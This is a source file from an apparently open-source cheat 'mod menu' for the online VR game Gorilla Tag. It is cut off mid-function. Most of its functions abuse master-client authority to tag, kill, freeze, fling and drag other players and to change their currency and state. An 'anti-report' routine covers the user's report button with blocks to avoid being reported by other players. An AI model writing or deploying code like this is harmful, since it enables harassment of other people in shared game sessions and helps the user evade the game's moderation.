/*
 * Qubit Menu  Modules/Categories/Master.cs
 * A community driven mod menu for Gorilla Tag with over 1000+ mods
 *
 * Copyright (C) 2026  Qubit Software  /Derivative work of Seralyth Software, Goldentrophy Software
 * https://github.com/QubitGT/Qubit
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

using GorillaGameModes;
using GorillaTagScripts.Builder;
using GorillaTagScripts.VirtualStumpCustomMaps;
using Photon.Pun;
using Photon.Realtime;
using Qubit.Core;
using Qubit.Extensions;
using Qubit.Libraries.Core;
using Qubit.Libraries.Entities;
using Qubit.Libraries.Interface;
using Qubit.Libraries.Networking;
using Qubit.Modules.Categories.Gamemode;
using Qubit.Modules.Classes;
using Qubit.Patches.Netcode;
using Qubit.Patches.Tagging;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using static Qubit.Core.Security;
using static Qubit.Extensions.GameObj;
using static Qubit.Extensions.Players;
using static Qubit.Extensions.Random;
using HarmonyLib;
using static Qubit.Frontend.Prompts;
using static Qubit.Libraries.Controls.Controllers;
using static Qubit.Libraries.Networking.GameModes;
using static Qubit.Libraries.Networking.Serialization;
using static Qubit.Modules.Classes.GunLibrary;
using static Qubit.Modules.Manager;
using Audio = Qubit.Modules.Categories.Sound.Audio;
using Random = UnityEngine.Random;

namespace Qubit.Modules.Categories
{
    public static class Master
    {
        #region Settings
        public static float materialDelay;
        #endregion

        #region Methods
        public static void UntagAll()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                foreach (Player v in PhotonNetwork.PlayerList)
                    RemoveInfected(v);
            }
        }

        /// <summary>
        /// Untags everyone besides you.
        /// </summary>
        public static void UntagOthers()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            foreach (NetPlayer v in ManagerRegistry.NetworkSystem.PlayerListOthers)
                RemoveInfected(v);
        }

        /// <summary>
        /// Untags whoever gets near you when holding grip.
        /// </summary>
        public static void UntagAura()
        {
            if (!Networking.IsMasterClient || !rightGrab)
                return;

            foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && rig.IsTagged() && Vector3.Distance(rig.transform.position, References.LocalRig.transform.position) < 3f))
                RemoveInfected(GetPlayerFromVRRig(rig));
        }

        /// <summary>
        /// Tags everyone besides you.
        /// </summary>
        public static void TagOthers()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

                foreach (NetPlayer v in ManagerRegistry.NetworkSystem.PlayerListOthers.Where(v => !InfectedList().Contains(v)))
                    AddInfected(v);
        }

        /// <summary>
        /// Tags everyone besides whoever your hand desires.
        /// </summary>
        public static void TagAllExceptGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (!Networking.IsMasterClient)
                {
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    return;
                }

                NetPlayer except = GetPlayerFromVRRig(gunTarget);
                foreach (NetPlayer v in ManagerRegistry.NetworkSystem.PlayerListOthers.Where(v => v != except && !InfectedList().Contains(v)))
                    AddInfected(v);
            }, new GunLibrary.GunSettings { locks = true });
        }

        /// <summary>
        /// Spams tag and untag on whoever your hand desires.
        /// </summary>
        public static void MatGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (!Networking.IsMasterClient)
                    return;

                if (!(Time.time > Tag.spamTagDelay)) return;
                Tag.spamTagDelay = Time.time + 0.1f;

                NetPlayer target = GetPlayerFromVRRig(gunTarget);
                if (InfectedList().Contains(target))
                    RemoveInfected(target);
                else
                    AddInfected(target);
            }, new GunLibrary.GunSettings { locks = true });
        }

        /// <summary>
        /// Hold grip and spam tag and untag everyone nearby.
        /// </summary>
        public static void MatAura()
        {
            if (!Networking.IsMasterClient || !rightGrab)
                return;

            if (!(Time.time > Tag.spamTagDelay)) return;
            Tag.spamTagDelay = Time.time + 0.1f;

            foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && Vector3.Distance(rig.transform.position, References.LocalRig.transform.position) < 3f))
            {
                NetPlayer target = GetPlayerFromVRRig(rig);
                if (InfectedList().Contains(target))
                    RemoveInfected(target);
                else
                    AddInfected(target);
            }
        }
        public static void SpamTagSelf()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                if (!(Time.time > Tag.spamTagDelay)) return;
                Tag.spamTagDelay = Time.time + 0.1f;
                if (InfectedList().Contains(PhotonNetwork.LocalPlayer))
                    RemoveInfected(PhotonNetwork.LocalPlayer);
                else
                    AddInfected(PhotonNetwork.LocalPlayer);
            }
        }

        public static void SpamTagGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!Networking.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        if (Time.time > Tag.spamTagDelay)
                        {
                            Tag.spamTagDelay = Time.time + 0.1f;
                            if (InfectedList().Contains(lockTarget.GetPlayer()))
                                RemoveInfected(lockTarget.GetPlayer());
                            else
                                AddInfected(lockTarget.GetPlayer());
                        }
                    }
                }

                if (!GetGunInput(true)) return;
                VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                if (!gunTarget || gunTarget.IsLocal()) return;
                if (!PhotonNetwork.IsMasterClient) return;
                gunLocked = true;
                lockTarget = gunTarget;
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void SpamTagAll()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                if (!(Time.time > Tag.spamTagDelay)) return;
                Tag.spamTagDelay = Time.time + 0.1f;
                foreach (Player v in PhotonNetwork.PlayerList)
                {
                    if (InfectedList().Contains(v))
                        AddInfected(v);
                    else
                        RemoveInfected(v);
                }
            }
        }

        public static void TagLagGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (PhotonNetwork.IsMasterClient)
                {
                    if (lockTarget != null)
                        TagReports.blacklistedPlayers.Remove(lockTarget.GetPlayer());

                    gunLocked = true;
                    lockTarget = gunTarget;

                    TagReports.blacklistedPlayers.Add(GetPlayerFromVRRig(gunTarget));
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    if (gunLocked)
                    {
                        gunLocked = false;
                        TagReports.blacklistedPlayers.Remove(lockTarget.GetPlayer());
                    }
                }
            });
        }

        public static void GiveTagLagGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (PhotonNetwork.IsMasterClient)
                {
                    if (lockTarget != null)
                        TagReports.invinciblePlayers.Remove(lockTarget.GetPlayer());

                    gunLocked = true;
                    lockTarget = gunTarget;

                    TagReports.invinciblePlayers.Add(GetPlayerFromVRRig(gunTarget));
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    if (gunLocked)
                    {
                        gunLocked = false;
                        TagReports.invinciblePlayers.Remove(lockTarget.GetPlayer());
                    }
                }
            });
        }

        public static void SetTagCooldown(float value)
        {
            if (!Networking.InRoom)
            {
                Notifications.SendFormat("red", "ERROR", "You are not in a room.");
                return;
            }
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }
            GorillaTagManager tagman = ManagerRegistry.GorillaTagManager;
            tagman.tagCoolDown = value;
        }

        public static void UntagGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal() && gunTarget.IsTagged())
                    {
                        if (PhotonNetwork.IsMasterClient)
                            RemoveInfected(GetPlayerFromVRRig(gunTarget));
                        else
                            Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    }
                }
            });
        }

        public static void PaintbrawlStartGame()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.StartPaintbrawl();
            }
        }

        public static void PaintbrawlEndGame()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.EndPaintbrawl();
            }
        }

        public static void PaintbrawlRestartGame()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.EndPaintbrawl();
                GameModes.StartPaintbrawl();
            }
        }
        public static void PaintbrawlBalloonSpamSelf()
        {
            if (Time.time < Paintbrawl.paintbrawlSpamDelay)
                return;

            Paintbrawl.paintbrawlSpamDelay = Time.time + 0.1f;

            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.SetPaintbrawlHealth(PhotonNetwork.LocalPlayer.ActorNumber, Random.Range(0, 4));
            }
        }

        public static void PaintbrawlBalloonSpamGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!Networking.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        if (Time.time > Paintbrawl.paintbrawlSpamDelay)
                        {
                            Paintbrawl.paintbrawlSpamDelay = Time.time + 0.1f;

                            if (!Networking.IsMasterClient)
                                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                            else
                            {
                                GameModes.SetPaintbrawlHealth(PhotonNetwork.LocalPlayer.ActorNumber, Random.Range(0, 4));
                            }
                        }
                    }
                }
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal())
                    {
                        if (PhotonNetwork.IsMasterClient)
                        {
                            gunLocked = true;
                            lockTarget = gunTarget;
                        }
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void PaintbrawlBalloonSpam()
        {
            if (Time.time < Paintbrawl.paintbrawlSpamDelay)
                return;

            Paintbrawl.paintbrawlSpamDelay = Time.time + 0.1f;

            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                foreach (Player player in PhotonNetwork.PlayerList)
                    GameModes.SetPaintbrawlHealth(player.ActorNumber, Random.Range(0, 4));
            }
        }

        public static void PaintbrawlReviveGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                NetPlayer owner = GetPlayerFromVRRig(gunTarget);
                if (!Networking.IsMasterClient)
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                else
                {
                    GameModes.SetPaintbrawlHealth(owner.ActorNumber, 4);
                }
            });
        }

        public static void PaintbrawlReviveSelf()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.SetPaintbrawlHealth(PhotonNetwork.LocalPlayer.ActorNumber, 4);
            }
        }

        public static void PaintbrawlReviveAll()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                foreach (Player player in PhotonNetwork.PlayerList)
                    GameModes.SetPaintbrawlHealth(player.ActorNumber, 4);
            }
        }

        public static void PaintbrawlNoDelay()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.SetPaintbrawlCooldowns(0f, 0f, 0f);
            }
        }

        public static void DisablePaintbrawlNoDelay()
        {
            GameModes.SetPaintbrawlCooldowns(3f, 5f, 2f);
        }

        public static void PaintbrawlGodMode()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GameModes.SetPaintbrawlHealth(PhotonNetwork.LocalPlayer.ActorNumber, 4);
                References.Player.disableMovement = false;
            }
        }

        public static void SetCurrencySelf(int currency = 0)
        {
            if (!Networking.IsMasterClient) { return; }
            GRPlayer.Get(PhotonNetwork.LocalPlayer.ActorNumber).shiftCreditCache = currency;
        }

        public static void SetCurrencyGun(int currency = 0)
        {
            GunLibrary.Target(gunTarget =>
            {
                if (PhotonNetwork.IsMasterClient)
                    GRPlayer.Get(GetPlayerFromVRRig(gunTarget).ActorNumber).shiftCreditCache = currency;
                else
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
            });
        }

        public static void SetCurrencyAll(int currency = 0)
        {
            if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }

            foreach (Player target in PhotonNetwork.PlayerList)
            {
                GRPlayer plr = GRPlayer.Get(target.ActorNumber);
                plr.shiftCreditCache = currency;
            }
        }

        public static void AddCurrencySelf(int currency = 0)
        {
            if (!Networking.IsMasterClient) { return; }
            GRPlayer.Get(PhotonNetwork.LocalPlayer.ActorNumber).shiftCreditCache += currency;
        }

        public static void AddCurrencyGun(int currency = 0)
        {
            GunLibrary.Target(gunTarget =>
            {
                if (PhotonNetwork.IsMasterClient)
                    GRPlayer.Get(GetPlayerFromVRRig(gunTarget).ActorNumber).shiftCreditCache += currency;
                else
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
            });
        }

        public static void AddCurrencyAll(int currency = 0)
        {
            if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }

            foreach (Player target in PhotonNetwork.PlayerList)
            {
                GRPlayer plr = GRPlayer.Get(target.ActorNumber);
                plr.shiftCreditCache += currency;
            }
        }

        public static void Invincibility()
        {
            if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }

            GRPlayer plr = GRPlayer.Get(PhotonNetwork.LocalPlayer.ActorNumber);

            if (plr.State == GRPlayer.GRPlayerState.Ghost)
                ManagerRegistry.GhostReactor.GhostReactorManager.RequestPlayerStateChange(plr, GRPlayer.GRPlayerState.Alive);

            plr.hp = plr.maxHp;
        }

        public static void StartShift()
        {
            if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
            ManagerRegistry.GhostReactor.GhostReactorManager.RequestShiftStartAuthority(ManagerRegistry.GhostReactor.Instance.shiftManager.ShiftState == GhostReactorShiftManager.State.WaitingForFirstShiftStart);
            RPCProtection();
        }

        public static void EndShift()
        {
            if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
            ManagerRegistry.GhostReactor.GhostReactorManager.RequestShiftEnd();
            RPCProtection();
        }

        public static void SetQuota()
        {
            if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
            ManagerRegistry.GhostReactor.Instance.shiftManager.shiftStats.SetShiftStat(GRShiftStatType.CoresCollected, ManagerRegistry.GhostReactor.Instance.shiftManager.coresRequiredToDelveDeeper);
            RPCProtection();
        }

        public static void GhostReactorFreezeGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                GameEntities.CreateItem(lockTarget.GetPlayer(), Fun.ObjectByName["GhostReactorEnergyCostGate"], lockTarget.headMesh.transform.position + RandomVector3(), RandomQuaternion(), Vector3.zero, Vector3.zero);
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void GhostReactorFreezeAll()
        {
            VRRig randomPlayer = GetRandomVRRig();
            GameEntities.CreateItem(randomPlayer.GetPlayer(), Fun.ObjectByName["GhostReactorEnergyCostGate"], randomPlayer.headMesh.transform.position + RandomVector3(), RandomQuaternion(), Vector3.zero, Vector3.zero);
        }
        public static void SetStateSelf(int state) =>
            Fun.SetPlayerState(PhotonNetwork.LocalPlayer, (GRPlayer.GRPlayerState)state);

        public static void SetStateAll(int state)
        {
            foreach (Player target in PhotonNetwork.PlayerList)
                Fun.SetPlayerState(target, (GRPlayer.GRPlayerState)state);
        }

        public static void SetStateGun(int state)
        {
            GunLibrary.Target(gunTarget =>
            {
                Fun.SetPlayerState(gunTarget, (GRPlayer.GRPlayerState)state);
            });
        }

        public static void SpazKillSelf()
        {
            if (Time.time > Fun.killDelay)
            {
                Fun.killDelay = Time.time + 0.1f;

                GRPlayer plr = GRPlayer.Get(PhotonNetwork.LocalPlayer.ActorNumber);
                Fun.SetPlayerState(PhotonNetwork.LocalPlayer, plr.State == GRPlayer.GRPlayerState.Alive ? GRPlayer.GRPlayerState.Ghost : GRPlayer.GRPlayerState.Alive);
            }
        }

        public static void SpazKillGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                Fun.killDelay = Time.time + 0.1f;
                GRPlayer plr = GRPlayer.Get(GetPlayerFromVRRig(gunTarget).ActorNumber);
                Fun.SetPlayerState(gunTarget, plr.State == GRPlayer.GRPlayerState.Alive ? GRPlayer.GRPlayerState.Ghost : GRPlayer.GRPlayerState.Alive);
            }, new GunLibrary.GunSettings { when = () => Time.time > Fun.killDelay });
        }

        public static void SpazKillAll()
        {
            if (Time.time > Fun.killDelay)
            {
                foreach (Player target in PhotonNetwork.PlayerList)
                {
                    Fun.killDelay = Time.time + 0.1f;

                    GRPlayer plr = GRPlayer.Get(target.ActorNumber);
                    Fun.SetPlayerState(target, plr.State == GRPlayer.GRPlayerState.Alive ? GRPlayer.GRPlayerState.Ghost : GRPlayer.GRPlayerState.Alive);
                }
            }
        }
        public static void EnableAtticAntiReport() =>
            Blocks.startTimeBuilding = Time.time + 5f;

        public static void AtticAntiReport()
        {
            if (Time.time > Blocks.startTimeBuilding)
                return;

            foreach (var line in GorillaScoreboardTotalUpdater.allScoreboardLines.Where(line => line.linePlayer == Networking.LocalPlayer))
            {
                Blocks.CreatePiece(-566818631, line.reportButton.transform.position + RandomVector3(0.3f), RandomQuaternion(), 0, null, true);
                RPCProtection();
            }
        }

        public static void AtticDrawGun()
        {
            GunLibrary.Point(NewPointer =>
            {
                if (!PhotonNetwork.IsMasterClient)
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                else
                    Coroutines.instance.StartCoroutine(Fun.DrawSmallDelay(NewPointer.transform.position));
            });
        }

        public static void AtticBuildGun()
        {
            GunLibrary.Point(NewPointer =>
            {
                if (!PhotonNetwork.IsMasterClient)
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                else
                {
                    Blocks.CreatePiece(Blocks.pieceIdSet, NewPointer.transform.position, RandomQuaternion(), 0, null, true);
                    RPCProtection();
                }
            });
        }

        public static void AtticFreezeGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                if (!PhotonNetwork.IsMasterClient)
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                else
                {
                    Player target = NetPlayerToPlayer(lockTarget.GetPlayer());
                    Blocks.CreatePiece(-566818631, lockTarget.headMesh.transform.position + RandomVector3(0.4f), RandomQuaternion(), 0, target, true);
                    Blocks.CreatePiece(-566818631, lockTarget.leftHandTransform.position + RandomVector3(0.4f), RandomQuaternion(), 0, target, true);
                    Blocks.CreatePiece(-566818631, lockTarget.rightHandTransform.position + RandomVector3(0.4f), RandomQuaternion(), 0, target, true);
                    RPCProtection();
                }
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void AtticFreezeAll()
        {
            if (rightTrigger > 0.5f)
            {
                Player target = GetRandomPlayer(false);

                if (!PhotonNetwork.IsMasterClient)
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                else
                {
                    GetVRRigFromPlayer(target);
                    Blocks.CreatePiece(-566818631, lockTarget.headMesh.transform.position + RandomVector3(0.4f), RandomQuaternion(), 0, target, true);
                    Blocks.CreatePiece(-566818631, lockTarget.leftHandTransform.position + RandomVector3(0.4f), RandomQuaternion(), 0, target, true);
                    Blocks.CreatePiece(-566818631, lockTarget.rightHandTransform.position + RandomVector3(0.4f), RandomQuaternion(), 0, target, true);
                    RPCProtection();
                }
            }
        }
        public static void AtticFloatGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!PhotonNetwork.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        Fun.floatPower += (0.3f - Fun.floatPower) * 0.05f;
                        Blocks.CreatePiece(-566818631, lockTarget.transform.position + Vector3.down * Fun.floatPower, Quaternion.Euler(0f, Random.Range(0f, 350f), 0f), 0, NetPlayerToPlayer(lockTarget.GetPlayer()), true);
                        RPCProtection();
                    }
                }
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal())
                    {
                        gunLocked = true;
                        lockTarget = gunTarget;
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    Fun.floatPower = 0.35f;
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void AtticFlingGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!PhotonNetwork.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        Blocks.CreatePiece(-566818631, lockTarget.transform.position + Vector3.down * 0.35f, Quaternion.Euler(0f, Random.Range(0f, 350f), 0f), 0, NetPlayerToPlayer(lockTarget.GetPlayer()), false, true, Vector3.up * 50f);
                        RPCProtection();
                    }
                }
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal())
                    {
                        gunLocked = true;
                        lockTarget = gunTarget;
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    Fun.floatPower = 0.35f;
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void AtticBringGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!PhotonNetwork.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        Blocks.CreatePiece(-566818631, lockTarget.transform.position, Quaternion.Euler(0f, Random.Range(0f, 350f), 0f), 0, NetPlayerToPlayer(lockTarget.GetPlayer()), false, true, (References.HeadCollider.transform.position - lockTarget.transform.position).normalized * 50f);
                        RPCProtection();
                    }
                }
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal())
                    {
                        gunLocked = true;
                        lockTarget = gunTarget;
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    Fun.floatPower = 0.35f;
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void AtticPushGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!PhotonNetwork.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        Blocks.CreatePiece(-566818631, lockTarget.transform.position, Quaternion.Euler(0f, Random.Range(0f, 350f), 0f), 0, NetPlayerToPlayer(lockTarget.GetPlayer()), false, true, (lockTarget.transform.position - References.HeadCollider.transform.position).normalized * 50f);
                        RPCProtection();
                    }
                }
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal())
                    {
                        gunLocked = true;
                        lockTarget = gunTarget;
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    Fun.floatPower = 0.35f;
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }
        public static void AtticTowerGun()
        {
            GunLibrary.Aim(GunData =>
            {
                GameObject NewPointer = GunData.NewPointer;

                if (Fun.position != Vector3.zero)
                {
                    Blocks.CreatePiece(Blocks.pieceIdSet, Fun.position, Quaternion.Euler(0f, Time.frameCount % 360, 0f), 0, null, true);
                    RPCProtection();

                    Fun.position += new Vector3(0f, 0.1f, 0f);
                }

                if (GetGunInput(true))
                    Fun.position = NewPointer.transform.position;
            }, new GunLibrary.GunSettings { onIdle = () => { Fun.position = Vector3.zero; } });
        }
        public static void Shotgun()
        {
            if (Fun.isFiring)
                References.InputPoller.leftControllerGripFloat = 1f;

            if (rightGrab && !Fun.previousGripDown)
                Coroutines.instance.StartCoroutine(Blocks.CreateShotgun());

            if (rightGrab && rightTrigger > 0.5f && !Fun.previousTriggerDown)
                Coroutines.instance.StartCoroutine(Fun.FireShotgun());

            Fun.previousGripDown = rightGrab;
            Fun.previousTriggerDown = rightTrigger > 0.5f;
        }

        public static void SlowMonsters()
        {
            foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
            {
                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                monkeyeAI.speed = 0.02f;
            }
        }

        public static void FastMonsters()
        {
            foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
            {
                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                monkeyeAI.speed = 0.5f;
            }
        }

        public static void FixMonsters()
        {
            foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
            {
                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                monkeyeAI.speed = 0.1f;
            }
        }

        public static void GrabMonsters()
        {
            if (rightGrab)
            {
                foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
                {
                    if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                    monkeyeAI.gameObject.transform.position = References.RightHand.position;
                }
            }
        }

        public static void MonsterGun()
        {
            GunLibrary.Point(NewPointer =>
            {
                foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
                {
                    if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                    monkeyeAI.gameObject.transform.position = NewPointer.transform.position + Vector3.up;
                }
            });
        }

        public static void SpazMonsters()
        {
            foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
            {
                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                monkeyeAI.transform.rotation = Quaternion.Euler(new Vector3(Random.Range(0, 360), Random.Range(0, 360), Random.Range(0, 360)));
            }
        }

        public static void OrbitMonsters()
        {
            MonkeyeAI[] them = GetAllType<MonkeyeAI>();
            int index = 0;
            foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
            {
                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                float offset = 360f / them.Length * index;
                monkeyeAI.transform.position = References.HeadCollider.transform.position + new Vector3(MathF.Cos(offset + (float)Time.frameCount / 30) * 2f, 1f, MathF.Sin(offset + (float)Time.frameCount / 30) * 2f);
                index++;
            }
        }

        public static void DestroyMonsters()
        {
            foreach (MonkeyeAI monkeyeAI in GetAllType<MonkeyeAI>())
            {
                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }
                monkeyeAI.gameObject.transform.position = new Vector3(99999f, 99999f, 99999f);
            }
        }

        #region OG Basement Monsters

        private static readonly Vector3 MonsterHome = new Vector3(-375.5306f, -2.886f, 355.0327f);

        private static bool InOGBasement() =>
            References.LocalRig.zoneEntity.currentZone == GTZone.VIMExperience2;

        /// <summary>
        /// Moves the four OG basement monsters to the given positions, as long as they stay near their home.
        /// </summary>
        public static void MoveMonsters(Vector3[] positions, int index = -1)
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            if (!InOGBasement())
            {
                Notifications.SendFormat("red", "ERROR", "You must be in the OG basement.");
                return;
            }

            if (positions.Any(p => Vector3.Distance(MonsterHome, p) > 4.3f))
            {
                Notifications.SendFormat("red", "ERROR", "Monsters can't move that far away.");
                return;
            }

            string path = "Environment Objects/05Maze_PersistentObjects/BasementMaze/Monkeye_Prefab_";
            string[] names = { "Angry", "Tweaky", "Sleepy", "Keen" };
            for (int i = 0; i < names.Length; i++)
            {
                if (index != -1 && index != i) continue;

                GameObject monster = GetObject(path + names[i]);
                if (monster != null)
                    monster.transform.position = positions[i];
            }
        }

        /// <summary>
        /// Resets the OG basement monsters to their home position.
        /// </summary>
        public static void ResetMonsters()
        {
            MoveMonsters(new[] { MonsterHome, MonsterHome, MonsterHome, MonsterHome });
        }

        /// <summary>
        /// Stacks the four monsters at the target with small height offsets.
        /// </summary>
        public static void MonsterStackGun()
        {
            GunLibrary.Point(NewPointer =>
            {
                Vector3 basePosition = NewPointer.transform.position;
                MoveMonsters(new[]
                {
                    basePosition + new Vector3(0f, 0.05f, 0f),
                    basePosition + new Vector3(0f, 0.1f, 0f),
                    basePosition + new Vector3(0f, 0.15f, 0f),
                    basePosition + new Vector3(0f, 0.2f, 0f)
                });
            });
        }

        /// <summary>
        /// Floats whoever your hand desires using the four monsters placed under their limbs.
        /// </summary>
        public static void MonsterFloatGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                Transform target = gunTarget.transform;
                MoveMonsters(new[]
                {
